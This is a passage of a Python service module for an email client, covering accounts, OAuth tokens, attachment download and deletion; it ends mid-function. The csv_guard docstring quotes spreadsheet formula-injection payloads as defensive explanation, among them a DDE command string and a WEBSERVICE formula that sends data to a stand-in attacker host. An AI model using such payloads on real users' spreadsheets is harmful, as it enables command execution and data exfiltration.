"""应用服务层：用例编排（账号管理、邮件查询、附件）。"""
from __future__ import annotations

import contextlib
import csv
import email
import email.message
import logging
import os
import re
import threading
import time
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path

from ..config import (
    ATTACHMENT_DIR,
    DANGEROUS_EXTENSIONS,
    DEFAULT_SYNC_INTERVAL,
    MAX_ATTACHMENT_BYTES,
    MAX_PREVIEW_BYTES,
    PLATFORMS,
    SYNC_SERVER_FLAGS,
)
from ..platforms import ImapError, get_adapter, make_account_stub
from ..platforms.oauth import (
    OAuthError,
    TokenSet,
    provider_for,
    refresh_access_token,
)
from ..platforms.smtp import SmtpConfig, SmtpError, build_message, send as smtp_send
from ..storage import (
    AccountRepository,
    AttachmentRepository,
    CursorRepository,
    MailRepository,
    OutboxRepository,
    PendingFlagRepository,
)
from .events import EventBus
from .models import (
    Account,
    AccountDraft,
    AccountStatus,
    Attachment,
    Mail,
    MailFilter,
    MailSummary,
    OUTBOX_FAILED,
    OUTBOX_PENDING,
    OUTBOX_SENDING,
    OUTBOX_SENT,
    OutboxMessage,
    ThreadSummary,
)
from .security import SecurityError, SecurityService

log = logging.getLogger(__name__)

_UNSAFE_FILENAME = re.compile(r'[<>:"/\\|?*\x00-\x1f]')

# Windows 上这几个名字（带任意扩展名）指向设备而不是普通文件，创建会失败或行为诡异
_WINDOWS_RESERVED = frozenset(
    {"con", "prn", "aux", "nul"}
    | {f"com{i}" for i in range(1, 10)}
    | {f"lpt{i}" for i in range(1, 10)}
)

# 计数快照的安全网：所有已知的写入路径都会显式失效缓存，
# 但万一有遗漏，超过这个时间也会自然过期，避免计数长期错下去。
COUNT_CACHE_TTL_SECONDS = 2.0


def safe_attachment_name(filename: str | None, max_len: int = 120) -> str:
    """把不可信的附件文件名压成一个「纯名字」——不含任何路径语义。

    附件名来自第三方邮件，可能带 `../`、绝对路径、NTFS 保留设备名（CON/NUL/COM1）、
    控制字符或超长串。这是纵深防御的一层：落盘时还会再叠一层
    「`<附件 id 前 8 位>_` 前缀 + 只在本程序专属目录内拼接」，所以即使这里漏了
    也走不出 ATTACHMENT_DIR；但两层都要有，不能只靠其中一层。
    """
    name = _UNSAFE_FILENAME.sub("_", filename or "")
    # 结尾的空白与点会被 Windows 静默截断，导致落盘名和记录名不一致
    name = name.strip().rstrip(". ")
    if not name:
        return "attachment.bin"
    if name.split(".", 1)[0].lower() in _WINDOWS_RESERVED:
        name = "_" + name
    if len(name) > max_len:                     # 超长文件名在部分文件系统上会失败
        stem, dot, ext = name.rpartition(".")
        name = (stem[: max_len - 20] + (dot + ext[:19] if dot else "")) or "attachment.bin"
    return name


_TAG_RE = re.compile(r"<[^>]+>")


def _strip_tags(html: str | None) -> str:
    """把 HTML 粗略降为纯文本（仅在重建 `.eml` 且没有明文正文时兜底）。"""
    if not html:
        return ""
    return re.sub(r"\s+", " ", _TAG_RE.sub(" ", html)).strip()


def decode_text_bytes(data: bytes) -> str:
    """把字节流解成文本（预览 `text/*` 附件用）。

    与 MIME 解析同源的保守策略：先按 UTF-8 严格解，失败再试 GB18030——
    后者覆盖 GBK/GB2312 且对任何字节序列都能解出结果（最差是乱码），
    因此不会抛异常。UTF-8 合法时优先 UTF-8 可避免把西文误判成中文。
    """
    for enc in ("utf-8", "utf-8-sig", "gb18030", "latin-1"):
        try:
            return data.decode(enc)
        except (UnicodeDecodeError, LookupError):
            continue
    return data.decode("utf-8", errors="replace")


# Excel / LibreOffice / Numbers 会把以这些字符开头的单元格当公式求值
_CSV_FORMULA_TRIGGERS = ("=", "+", "-", "@", "\t", "\r", "\n")


def csv_guard(value: object) -> str:
    """把来自邮件的文本转成「不会被表格软件当公式求值」的单元格。

    `csv.writer` 的引号只解决**分隔符冲突**（逗号、引号、换行），
    完全不解决**公式注入**：Excel 与 LibreOffice 会把以 `=` `+` `-` `@`
    或制表符/回车开头的单元格当公式。于是任意发件人可控的字段
    （显示名、地址、主题、摘要）都能变成载荷：

    * `=cmd|' /C calc'!A0` —— 旧版 Excel 的 DDE，可执行本机命令；
    * `=WEBSERVICE("https://attacker/"&A1)` —— 把邮件清单外带出去；
    * `=HYPERLINK(...)` —— 钓鱼跳转。

    对以危险字符开头的值加一个前导单引号：这是 Excel 的「强制文本」约定，
    显示时引号不可见、内容按字面量呈现，LibreOffice 与 Numbers 行为一致。

    对 `lstrip()` 之后的首字符也做判断——各家表格软件对前导空白的裁剪
    规则不一致，宁可多一个引号，也不赌某个版本会 trim。
    """
    text = "" if value is None else str(value)
    if not text:
        return text
    if text.lstrip(" \u00a0")[:1] in _CSV_FORMULA_TRIGGERS:
        return "'" + text
    return text


def unlink_attachment_file(path: str | Path | None) -> bool:
    """尽力删除附件落盘文件。

    邮件/账号被删除、附件元数据被替换时都要调用它——历史实现只删数据库行，
    磁盘上的明文副本会永久残留，与「整库加密」的安全承诺自相矛盾。
    """
    if not path:
        return False
    try:
        target = Path(path)
        if target.is_file():
            target.unlink()
            return True
    except OSError as exc:
        log.warning("删除附件文件失败 %s：%s", path, exc)
    return False


@dataclass
class AttachmentSaveResult:
    """附件落盘结果。"""
    path: Path
    size: int
    renamed: bool            # 是否因危险扩展名而被改成不可执行后缀
    name_hint: str = ""      # 给用户的额外提示

    @property
    def danger(self) -> bool:
        return bool(self.name_hint)


@dataclass
class DeleteBatchResult:
    """批量删除的结果。

    刻意不用「删除成功 N 封」这种单一数字：走服务器删除时，一封失败不该让
    整批回滚，但用户必须知道**哪几封没删成**——否则他会以为全删干净了，
    而这正是「删除仅本地」这一类设计最容易给人的错觉。
    """
    removed: int = 0              # 本地副本已删除的封数
    moved_to_trash: int = 0       # 其中已同步移入服务器垃圾箱的封数
    failed: list[tuple[str, str]] = field(default_factory=list)   # (mail_id, 原因)
    removed_ids: list[str] = field(default_factory=list)          # 供界面精确摘除行


class AccountService:
    """账号管理用例。"""

    def __init__(self, accounts: AccountRepository, cursors: CursorRepository,
                 security: SecurityService, bus: EventBus,
                 pending_flags: PendingFlagRepository | None = None) -> None:
        self.accounts = accounts
        self.cursors = cursors
        self.security = security
        self.bus = bus
        self.pending_flags = pending_flags
        self._active_id: str | None = None
        # OAuth2 access_token 的内存缓存：{account_id: TokenSet}。
        # 刻意不落盘：access_token 通常 1 小时过期，重开进程再换一次即可；
        # 落盘只会多出一份需要加密、需要清理的凭证。
        self._tokens: dict[str, TokenSet] = {}

    # ------------------------------------------------------------ 查询
    def list(self) -> list[Account]:
        return self.accounts.list()

    def get(self, account_id: str) -> Account | None:
        return self.accounts.get(account_id)

    @property
    def active_id(self) -> str | None:
        return self._active_id

    def set_active(self, account_id: str | None) -> None:
        """切换当前活跃账号（仅改变视图过滤，不重建连接）。"""
        self._active_id = account_id
        self.bus.filter_changed.emit()

    # ------------------------------------------------------------ 校验
    def verify(self, draft: AccountDraft) -> tuple[bool, str]:
        """试连校验凭据，返回 (是否成功, 提示信息)。"""
        if not draft.email or "@" not in draft.email:
            return False, "请输入有效的邮箱地址"
        if not draft.password:
            if str(getattr(draft, "auth_type", "")).startswith("oauth2"):
                return False, "请先完成 OAuth2 授权"
            return False, "请输入密码或授权码"
        if draft.platform not in PLATFORMS:
            return False, "不支持的平台"

        adapter = get_adapter(draft.platform)
        stub = make_account_stub(draft)
        secret = draft.password
        if str(getattr(draft, "auth_type", "")).startswith("oauth2"):
            # draft.password 此时是 refresh_token：先换一个短期 access_token。
            # 不换的话 connect() 会拿 refresh_token 去 LOGIN，试连必然失败——
            # 用户会以为「授权成功但添加不了」。
            try:
                tokens = refresh_access_token(
                    provider_for(draft.platform), secret)
                secret = tokens.access_token
            except OAuthError as exc:
                return False, f"OAuth2 授权校验失败：{exc}"
        try:
            adapter.verify(stub, secret)
            return True, "连接成功，凭据有效"
        except ImapError as exc:
            return False, str(exc)
        except Exception as exc:  # noqa: BLE001
            return False, f"校验失败：{exc}"

    # ------------------------------------------------------------ 增删改
    def add(self, draft: AccountDraft) -> Account:
        if self.accounts.find(draft.platform, draft.email.lower()):
            raise ValueError("该邮箱已添加过了")

        cfg = PLATFORMS.get(draft.platform)
        if not draft.imap_host and cfg:
            draft.imap_host = cfg.imap_host
        if not draft.imap_port and cfg:
            draft.imap_port = cfg.imap_port
        if not draft.sync_interval:
            draft.sync_interval = DEFAULT_SYNC_INTERVAL

        account = self.accounts.insert(draft)
        ciphertext = self.security.encrypt_secret(draft.password)
        self.accounts.put_credential(account.id, ciphertext)
        self.cursors.upsert(account.id, "INBOX", 0, None)

        log.info("已添加账号 %s (%s)", account.email, account.platform)
        self.bus.accounts_changed.emit()
        return account

    def update(self, account_id: str, patch: dict, password: str | None = None) -> None:
        self.accounts.update_fields(account_id, patch)
        if password:
            self.accounts.put_credential(account_id, self.security.encrypt_secret(password))
        self.bus.accounts_changed.emit()

    def remove(self, account_id: str) -> None:
        account = self.accounts.get(account_id)
        stale = self.accounts.delete(account_id)
        for path in stale:
            unlink_attachment_file(path)
        if self.pending_flags is not None:
            # 账号都没了，还留着「待回写标记」只会在下次同步时刷一堆无主错误
            with contextlib.suppress(Exception):
                self.pending_flags.db.execute(
                    "DELETE FROM pending_flags WHERE account_id = ?", (account_id,))
        if self._active_id == account_id:
            self._active_id = None
        log.info("已删除账号 %s（同时清理 %d 个本地附件副本）",
                 account.email if account else account_id, len(stale))
        self.bus.accounts_changed.emit()

    def reload_password(self, account: Account) -> str:
        """取出这一步要用的凭据（仅内存）。

        * 密码账号：返回明文密码 / 授权码；
        * OAuth2 账号：库里存的是 **refresh_token**，这里按需换一个短期
          `access_token` 并缓存到过期为止。适配器按 `account.auth_type`
          决定走 `LOGIN` 还是 `AUTHENTICATE XOAUTH2`。

        刷新失败一律翻成 `SecurityError`：那意味着用户必须重新授权，
        重试没有意义（继续重试只会在服务端刷出更多失败）。
        """
        ct = self.accounts.get_credential(account.id)
        if ct is None:
            raise SecurityError("该账号缺少凭据，请重新添加")
        secret = self.security.decrypt_secret(ct)
        if not str(getattr(account, "auth_type", "")).startswith("oauth2"):
            return secret
        return self._access_token(account, secret)

    def _access_token(self, account: Account, refresh_token: str) -> str:
        cached = self._tokens.get(account.id)
        if (cached is not None and cached.refresh_token == refresh_token
                and not cached.expired()):
            return cached.access_token
        try:
            tokens = refresh_access_token(provider_for(account.platform), refresh_token)
        except OAuthError as exc:
            raise SecurityError(
                f"{account.email} 的 OAuth2 授权已失效：{exc}\n"
                "请在「设置 → 账号」里对该账号重新授权。"
            ) from exc
        # 刷新响应不一定带新的 refresh_token，沿用旧的，别把它覆盖成空串
        if not tokens.refresh_token:
            tokens.refresh_token = refresh_token
        self._tokens[account.id] = tokens
        return tokens.access_token

    def set_status(self, account_id: str, status: AccountStatus | str) -> None:
        value = status.value if isinstance(status, AccountStatus) else status
        self.accounts.set_status(account_id, value)


class MailService:
    """邮件查询、详情、附件用例。"""

    def __init__(self, mails: MailRepository, attachments: AttachmentRepository,
                 accounts: AccountRepository, security: SecurityService,
                 bus: EventBus, pending_flags: PendingFlagRepository | None = None) -> None:
        self.mails = mails
        self.attachments = attachments
        self.accounts = accounts
        self.security = security
        self.bus = bus
        self.pending_flags = pending_flags
        # 保活会话池由 AppContext 注入：core 层不能反向依赖 sync 层（会形成
        # import 循环——sync.worker 本身就要用到 AccountService）。
        self.sessions = None
        # 服务端标记双向同步开关（设置面板控制）
        self.sync_server_flags = SYNC_SERVER_FLAGS
        self._counts_cache: tuple[dict[str, tuple[int, int]],
                                  tuple[int, int]] | None = None
        self._counts_expires = 0.0
        # 计数缓存会被两条线程读写：`SyncWorker` 在后台线程发出 `sync_finished`
        # → 回调里 `invalidate_counts()` 在**worker 线程**执行（它不是 QObject
        # 的绑定方法，Qt 无从排队）；而主线程在 `_counts_snapshot()` 里读同一对
        # 字段。没有这把锁时会读到过期值（角标数字不更新），或 `_counts_expires`
        # 被写过导致缓存长期不失效。
        #
        # 这里用锁而不是 `@Slot`：`MailService` 属于 core 层，刻意**不**依赖 Qt
        # （本文件至今没有任何 PySide6 导入），不该为了线程归属把它变成 QObject。
        self._counts_lock = threading.Lock()
        # 同步线程直接写库（不走本服务），因此计数缓存必须在这里失效；
        # 漏掉任何一条写入路径都会让角标显示旧数字。
        bus.sync_finished.connect(lambda *_: self.invalidate_counts())
        bus.accounts_changed.connect(lambda *_: self.invalidate_counts())

    # ------------------------------------------------------------ 查询
    def inbox(self, flt: MailFilter) -> list[MailSummary]:
        """收件箱列表（轻量投影，不含正文与附件明细）。"""
        return self.mails.query_summaries(flt)

    def search_count(self, flt: MailFilter) -> int | None:
        """关键词命中总数（仅全文索引路径给得出；否则返回 None 表示「不显示」）。"""
        return self.mails.count_search(flt)

    def summaries_by_ids(self, mail_ids: list[str]) -> list[MailSummary]:
        return self.mails.summaries_by_ids(mail_ids)

    def get(self, mail_id: str) -> Mail | None:
        return self.mails.get(mail_id)

    # ------------------------------------------------------------ 会话视图
    def threads(self, flt: MailFilter) -> list[ThreadSummary]:
        """按会话归并的列表（折叠态）。"""
        return self.mails.thread_summaries(flt)

    def thread_mails(self, thread_key: str, limit: int = 100) -> list[MailSummary]:
        """展开某个会话后的成员邮件（时间升序 = 阅读顺序）。"""
        return self.mails.mails_in_thread(thread_key, limit)

    def invalidate_counts(self) -> None:
        """作废计数缓存。可能从后台同步线程调用，因此必须持锁。"""
        with self._counts_lock:
            self._counts_cache = None
            self._counts_expires = 0.0

    def _counts_snapshot(self) -> tuple[dict[str, tuple[int, int]], tuple[int, int]]:
        """带缓存的计数快照：一次聚合同时给出按账号与总计。

        `refresh_accounts()` 在每次列表刷新、每封邮件标已读时都会被调用，
        原先它要跑两次全表聚合（实测 2 万封 13.9–44 ms），随库线性增长。

        聚合本身放在锁外：它是纯读、可能耗时数十毫秒，不该阻塞
        `invalidate_counts()`（那条路径是后台同步线程在走，被拖住会推迟同步收尾）。
        代价是极端并发下两个线程可能各算一次，只是多一次查询、不影响正确性。
        """
        now = time.monotonic()
        with self._counts_lock:
            cached = self._counts_cache
            if cached is not None and now < self._counts_expires:
                return cached
        snapshot = self.mails.counts_snapshot()
        with self._counts_lock:
            self._counts_cache = snapshot
            self._counts_expires = time.monotonic() + COUNT_CACHE_TTL_SECONDS
        return snapshot

    def counts(self) -> dict[str, tuple[int, int]]:
        return self._counts_snapshot()[0]

    def total_counts(self) -> tuple[int, int]:
        return self._counts_snapshot()[1]

    # ------------------------------------------------------------ 状态
    def mark_read(self, mail_id: str, is_read: bool = True) -> None:
        self.mails.set_read(mail_id, is_read)
        self._queue_server_flag(mail_id, read=is_read)
        self.invalidate_counts()
        self.bus.mail_updated.emit(mail_id)

    def toggle_star(self, mail_id: str) -> bool:
        mail = self.mails.get(mail_id)
        if mail is None:
            return False
        new_state = not mail.is_starred
        self.mails.set_starred(mail_id, new_state)
        self._queue_server_flag(mail_id, starred=new_state)
        self.bus.mail_updated.emit(mail_id)
        return new_state

    def mark_all_read(self, account_id: str | None = None) -> None:
        affected = self.mails.ids_unread(account_id)
        self.mails.mark_all_read(account_id)
        # 走批量入队：逐封 `_queue_server_flag()` 时每封要一次 `mail_context`
        # 查询加一次队列写入，5000 封 ≈ 1.5 万条串行 SQL，全压在 GUI 线程上。
        self._queue_server_flags_many(affected, read=True)
        self.invalidate_counts()
        self.bus.accounts_changed.emit()

    def _queue_server_flag(self, mail_id: str, read: bool | None = None,
                           starred: bool | None = None) -> None:
        """把本地状态变化排进「待回写服务器」队列。

        只在开关打开时入队。入队而不是立刻推送，是因为点已读/星标是**高频、
        低价值**操作：为它同步等一次网络往返会让 UI 明显卡顿，
        而失败弹窗更没必要。真正推送发生在下次同步时（`SyncWorker`）。
        """
        if not (self.sync_server_flags and self.pending_flags is not None):
            return
        ctx = self.mails.mail_context(mail_id)
        if ctx is None:
            return
        add: list[str] = []
        remove: list[str] = []
        if read is not None:
            (add if read else remove).append("\\Seen")
        if starred is not None:
            (add if starred else remove).append("\\Flagged")
        try:
            self.pending_flags.add(ctx["account_id"], ctx.get("folder") or "INBOX",
                                   str(ctx["uid"]), add=add, remove=remove)
        except Exception:
            log.warning("排入待回写标记失败（本地状态已生效）", exc_info=True)

    def pending_flag_count(self, account_id: str | None = None) -> int:
        if self.pending_flags is None:
            return 0
        return self.pending_flags.count(account_id)

    def _queue_server_flags_many(self, mail_ids: list[str],
                                 read: bool | None = None,
                                 starred: bool | None = None) -> int:
        """批量把本地状态变化排进「待回写服务器」队列；返回入队组数。

        与逐封 `_queue_server_flag()` 的语义完全一致（同一个开关、同样的失败
        容忍），区别只是「一次批量查询 + 单事务写入」而不是 N 次。删除、批量
        标已读这类动辄上千封的操作必须走这里，否则 GUI 线程会被串行 SQL 拖住。
        """
        if not (self.sync_server_flags and self.pending_flags is not None):
            return 0
        if not mail_ids:
            return 0
        add: list[str] = []
        remove: list[str] = []
        if read is not None:
            (add if read else remove).append("\\Seen")
        if starred is not None:
            (add if starred else remove).append("\\Flagged")
        if not add and not remove:
            return 0
        try:
            contexts = self.mails.contexts_by_ids(mail_ids)
            if not contexts:
                return 0
            items = [
                (ctx["account_id"], ctx.get("folder") or "INBOX", str(ctx["uid"]),
                 add, remove)
                for ctx in contexts
            ]
            return self.pending_flags.add_many(items)
        except Exception:
            # 入队失败不影响本地状态（它已经生效了），留待下次同步重试
            log.warning("批量排入待回写标记失败（本地状态已生效）", exc_info=True)
            return 0

    def delete(self, mail_id: str, *, on_server: bool = False) -> str:
        """删除一封邮件。返回对服务器实际操作到的文件夹名（未走服务器时为空串）。

        `on_server=False`（默认）：**只**删本机副本，服务器完全不受影响。
        后果是重置同步 / 换设备后会重新出现——这也是界面上必须讲清楚的事。

        `on_server=True`：先把邮件移入服务器垃圾箱（可恢复），成功后才删本地。
        顺序刻意如此：服务器操作失败时**不动**本地数据，用户拿到的是一个明确的
        错误，而不是「本地没了、服务器还在」的假删除。
        """
        if not on_server:
            self._drop_local_mail(mail_id)
            return ""
        moved_to = self.move_to_trash(mail_id)
        self._drop_local_mail(mail_id)
        return moved_to

    def move_to_trash(self, mail_id: str) -> str:
        """只做服务端动作：把邮件移入垃圾箱，本地副本保持不变。

        拆出来是为了让「先服务器、后本地」这个顺序可测：调用方先执行本方法，
        确认没有抛错之后才删本地。
        """
        ctx = self.mails.mail_context(mail_id)
        if ctx is None:
            raise FileNotFoundError("邮件不存在或已被删除")
        account, password = self._account_and_password(ctx["account_id"])
        folder = ctx.get("folder") or "INBOX"
        uid = str(ctx["uid"])
        return self._with_connection(
            account, password,
            lambda adapter, imap: adapter.move_to_trash(imap, uid, folder=folder),
        )

    def _drop_local_mail(self, mail_id: str) -> None:
        stale = self.mails.delete(mail_id)
        for path in stale:
            unlink_attachment_file(path)
        self.invalidate_counts()
        self.bus.mail_deleted.emit(mail_id)

    def cleanup_orphan_attachments(self) -> int:
        """清理附件目录里「数据库已经不认识」的残留文件。

        触发场景：异常退出、手改数据库、早期版本只删行不删文件。
        启动时调用一次即可。
        """
        known = self.mails.all_stored_paths()
        known_names = {Path(p).name for p in known}
        removed = 0
        try:
            entries = list(ATTACHMENT_DIR.glob("*"))
        except OSError:
            return 0
        for entry in entries:
            if not entry.is_file():
                continue
            if entry.name in known_names or str(entry) in known:
                continue
            # 只清理本程序命名规则下的文件（<8位id>_…），避免误删用户放进来的东西
            if not re.match(r"^[0-9a-f]{8}_", entry.name):
                continue
            if unlink_attachment_file(entry):
                removed += 1
        if removed:
            log.info("已清理 %d 个孤儿附件文件", removed)
        return removed

    # ------------------------------------------------------------ 附件
    def download_attachment(self, attachment_id: str) -> AttachmentSaveResult:
        """从 IMAP 服务器拉取附件真实字节流并落盘。

        流程：查附件所属邮件的 account/folder/uid/part_index
              → 取该账号凭据 → 连接 IMAP → FETCH BODY[part] → 解码 → 写盘

        落盘策略（A.6）：
            · 下载前按元数据里的 size 预检上限，下载后再按真实长度复核；
            · 以 `O_CREAT|O_EXCL` **独占**创建目标文件，绝不改写已有文件；
            · 先写 `*.part` 再 `os.replace` 原子改名，避免杀软/同步盘扫到半成品；
            · 危险扩展名不还原成可执行后缀（保留 `.download`）并在 UI 警示。
        """
        att = self.attachments.get(attachment_id)
        if att is None:
            raise FileNotFoundError("附件记录不存在")

        danger_ext = self._dangerous_extension(att.filename)

        # 已下载过则直接复用
        if att.stored_path and Path(att.stored_path).exists():
            existing = Path(att.stored_path)
            # 以磁盘上的真实名字为准：旧版本落盘的文件没有经过「危险扩展名改写」，
            # 不能对它声称「已保存为 .download」——那会让用户以为风险已消除。
            renamed = bool(danger_ext) and existing.name.lower().endswith(".download")
            return AttachmentSaveResult(
                existing, att.size, renamed=renamed,
                name_hint=self._danger_hint(att.filename, renamed) if danger_ext else "",
            )

        self._check_size_limit(att.size, att.filename)

        data = self._fetch_attachment_from_server(attachment_id, att)

        # 元数据里的 size 可能来自估算或缺失，落盘前用真实长度再判一次
        self._check_size_limit(len(data), att.filename)

        safe = safe_attachment_name(att.filename)
        final_name = f"{att.id[:8]}_{safe}"
        if danger_ext:
            final_name += ".download"           # 不还原可执行后缀
        target = ATTACHMENT_DIR / final_name

        written = self._atomic_write_exclusive(target, data)
        self.attachments.set_stored_path(attachment_id, str(written))
        log.info("附件已下载：%s (%d 字节)", written.name, len(data))
        return AttachmentSaveResult(
            written, len(data), renamed=danger_ext,
            name_hint=self._danger_hint(att.filename, danger_ext) if danger_ext else "",
        )

    # ------------------------------------------------------------ 连接复用
    def _with_connection(self, account: Account, password: str, fn):
        """在账号连接上执行 `fn(adapter, imap)`，优先复用保活会话。

        会话池由 AppContext 注入。没有会话池时退回「一次一连接」——
        功能等价，只是每次都要重新握手。
        """
        adapter = get_adapter(account.platform)
        if self.sessions is not None:
            with self.sessions.borrow(account, password) as imap:
                return fn(adapter, imap)
        imap = adapter.connect(account, password)
        try:
            return fn(adapter, imap)
        finally:
            adapter.disconnect(imap)

    def _account_and_password(self, account_id: str) -> tuple[Account, str]:
        account = self.accounts.get(account_id)
        if account is None:
            raise FileNotFoundError("附件所属账号已被删除")
        ciphertext = self.accounts.get_credential(account.id)
        if ciphertext is None:
            raise SecurityError("无法获取该账号凭据，请重新添加账号")
        return account, self.security.decrypt_secret(ciphertext)

    def _fetch_attachment_from_server(self, attachment_id: str,
                                      att: Attachment) -> bytes:
        """按 part 编号从服务器取回附件的**真实字节流**。"""
        ctx = self.mails.mail_context_of_attachment(attachment_id)
        if ctx is None:
            raise FileNotFoundError("找不到附件所属邮件")
        part_index = (ctx.get("part_index") or "").strip()
        if not part_index:
            raise ValueError(
                "该附件缺少 IMAP 部件编号，无法下载。\n"
                "可能是旧版本同步的数据，请重新同步该邮件后再试。"
            )
        account, password = self._account_and_password(ctx["account_id"])
        folder = ctx.get("folder") or "INBOX"

        def _fetch(adapter, imap):
            # 只读 select 可能被部分服务器拒绝；拒绝不影响接下来的 BODY[part]
            # （多数服务器在登录后已默认选中 INBOX），因此这里不构成失败条件。
            with contextlib.suppress(Exception):
                imap.select(folder, readonly=True)
            return adapter.fetch_attachment(imap, str(ctx["uid"]), part_index)

        try:
            raw = self._with_connection(account, password, _fetch)
        except ImapError as exc:
            raise ImapError(f"从服务器下载附件失败：{exc}") from exc
        if not raw:
            raise ValueError("服务器返回的附件内容为空")
        # 按原始 MIME 重新解码（IMAP 返回的可能是 base64/quoted-printable）
        return self._decode_attachment_payload(raw, att.content_type)

    # ------------------------------------------------------------ 内联预览
    def attachment_bytes(self, attachment_id: str, *,
                         max_bytes: int | None = MAX_PREVIEW_BYTES,
                         allow_network: bool = True) -> bytes:
        """取附件字节流：本地已有就直读，否则按需下载（并落盘缓存）。

        与 `download_attachment` 的差别：这里不改变文件名、不追加 `.download`
        后缀（预览不落用户可见目录），只关心「拿到字节」。
        """
        att = self.attachments.get(attachment_id)
        if att is None:
            raise FileNotFoundError("附件记录不存在")
        if att.stored_path and Path(att.stored_path).is_file():
            data = Path(att.stored_path).read_bytes()
        else:
            if not allow_network:
                raise FileNotFoundError("附件尚未下载到本地")
            if max_bytes and att.size and att.size > max_bytes:
                raise ValueError(
                    f"附件约 {att.size / 1024 / 1024:.1f} MB，超过预览上限 "
                    f"{max_bytes / 1024 / 1024:.0f} MB。请先下载到本地再打开。"
                )
            data = self._fetch_attachment_from_server(attachment_id, att)
            # 顺手落盘：下次预览/打开不必再走一趟网络
            with contextlib.suppress(OSError):
                target = ATTACHMENT_DIR / f"{att.id[:8]}_{safe_attachment_name(att.filename)}"
                written = self._atomic_write_exclusive(target, data)
                self.attachments.set_stored_path(attachment_id, str(written))
        if max_bytes and len(data) > max_bytes:
            raise ValueError(
                f"附件 {len(data) / 1024 / 1024:.1f} MB，超过预览上限 "
                f"{max_bytes / 1024 / 1024:.0f} MB。请先下载到本地再打开。"
            )
        return data

    def preview_attachment(self, attachment_id: str) -> tuple[str, object]:
        """返回 `(kind, payload)` 供详情面板内联预览。

        kind ∈ {"image", "text", "none"}：
          * image → payload 是 bytes（由 UI 层用 QImage 解出）
          * text  → payload 是已解码的 str
        刻意不做 PDF 渲染：多一个重量级依赖，而且 PDF 阅读器本来就
        比内嵌渲染好用——这类附件走「下载后打开」更合适。
        """
        att = self.attachments.get(attachment_id)
        if att is None:
            raise FileNotFoundError("附件记录不存在")
        ctype = (att.content_type or "").lower()
        if ctype.startswith("image/"):
            return "image", self.attachment_bytes(attachment_id)
        if (ctype.startswith("text/") or ctype in
                ("application/json", "application/xml", "application/csv")):
            data = self.attachment_bytes(attachment_id, max_bytes=2 * 1024 * 1024)
            return "text", decode_text_bytes(data)
        return "none", ""

    # ------------------------------------------------------------ 内嵌图片
    def inline_resource(self, mail_id: str, content_id: str) -> bytes | None:
        """解析正文里的 `cid:` 引用 → 本地已缓存的字节。

        **只在本地已有缓存时返回**，绝不在渲染正文时发起网络请求：
        `loadResource()` 是在 UI 线程里被同步调用的，一旦联网就会整窗卡住。
        要加载内嵌图片，由用户显式点「加载内嵌图片」触发后台下载。
        """
        att = self.attachments.by_content_id(mail_id, content_id)
        if att is None or not att.stored_path:
            return None
        path = Path(att.stored_path)
        if not path.is_file():
            return None
        try:
            return path.read_bytes()
        except OSError:
            return None

    def inline_missing(self, mail_id: str) -> list[Attachment]:
        """该邮件里「有 cid 但本地没有缓存」的内嵌资源。"""
        out = []
        for att in self.attachments.inline_of_mail(mail_id):
            if att.stored_path and Path(att.stored_path).is_file():
                continue
            out.append(att)
        return out

    def download_inline_images(self, mail_id: str,
                               limit: int = 20) -> tuple[int, int]:
        """下载该邮件的内嵌图片，返回 `(成功数, 失败数)`。

        由用户显式触发（详情面板的按钮），不自动执行——自动下载内嵌图片
        等价于自动加载远程内容，正是跟踪像素想达到的效果。
        """
        ok = failed = 0
        for att in self.inline_missing(mail_id)[:limit]:
            try:
                self.attachment_bytes(att.id)
                ok += 1
            except (OSError, ValueError, FileNotFoundError, ImapError, SecurityError):
                log.warning("内嵌资源下载失败：%s", att.filename, exc_info=True)
                failed += 1
        return ok, failed

    # ------------------------------------------------------------ 批量操作
    def mark_read_many(self, mail_ids: list[str], is_read: bool = True) -> int:
        n = self.mails.set_read_many(mail_ids, is_read)
        self._queue_server_flags_many(mail_ids, read=is_read)
        self.invalidate_counts()
        self.bus.accounts_changed.emit()
        return n

    def star_many(self, mail_ids: list[str], starred: bool = True) -> int:
        n = self.mails.set_starred_many(mail_ids, starred)
        self._queue_server_flags_many(mail_ids, starred=starred)
        self.bus.accounts_changed.emit()
        return n

    def delete_many(self, mail_ids: list[str], *, on_server: bool = False) -> DeleteBatchResult:
        """批量删除本地副本；`on_server=True` 时同时移入服务器垃圾箱。

        走服务器时**逐封**处理、单封失败不中断整批：某一封的权限或状态问题
        不该让剩下的都删不掉。每封都遵循「先服务器、后本地」的顺序，
        但**本地清理合并成一次批量操作**（逐封删本地会退化成 N 次查询 + N 次
        「计数缓存作废 + 发信号」，在选中几百封时同样是 GUI 线程上的可观开销）。
        """
        result = DeleteBatchResult()
        if not on_server:
            stale = self.mails.delete_many(mail_ids)
            for path in stale:
                unlink_attachment_file(path)
            self.invalidate_counts()
            self.bus.mails_removed.emit(list(mail_ids))
            result.removed = len(mail_ids)
            result.removed_ids = list(mail_ids)
            return result

        removed_ids: list[str] = []
        for mail_id in mail_ids:
            try:
                self.move_to_trash(mail_id)
            except Exception as exc:      # noqa: BLE001 —— 单封失败不该拖垮整批
                result.failed.append((mail_id, str(exc)))
                continue
            removed_ids.append(mail_id)
        if removed_ids:
            # 服务器侧已确认移入垃圾箱，这里才一次性清本地
            stale = self.mails.delete_many(removed_ids)
            for path in stale:
                unlink_attachment_file(path)
            self.invalidate_counts()
            self.bus.mails_removed.emit(removed_ids)
        result.removed = len(removed_ids)
        result.moved_to_trash = len(removed_ids)
        result.removed_ids = removed_ids
        return result

    # ------------------------------------------------------------ 导出
    def build_rfc822(self, mail_id: str, *, allow_network: bool = True) -> bytes:
        """把一封邮件还原成 RFC822 字节流（`.eml` 的内容）。

        优先向服务器取**原始报文**（保留全部头部与编码，是无损的）；
        拿不到时用本地字段重建——正文、收件人、时间都在，
        但原始头部顺序与 DKIM 签名无法还原，因此会在重建件里留一个
        `X-UniMail-Note` 说明，避免下游误以为它是原件。
        """
        mail = self.mails.get(mail_id)
        if mail is None:
            raise FileNotFoundError("邮件不存在")

        if allow_network and self.sessions is not None:
            ctx = self.mails.mail_context(mail_id)
            if ctx:
                try:
                    account, password = self._account_and_password(ctx["account_id"])
                    folder = ctx.get("folder") or "INBOX"
                    uid = str(ctx["uid"])

                    def _fetch(adapter, imap):
                        with contextlib.suppress(Exception):
                            imap.select(folder, readonly=True)
                        return adapter.fetch_raw(imap, uid, headers_only=False)

                    raw = self._with_connection(account, password, _fetch)
                    if raw:
                        return raw
                except (ImapError, SecurityError, FileNotFoundError, OSError) as exc:
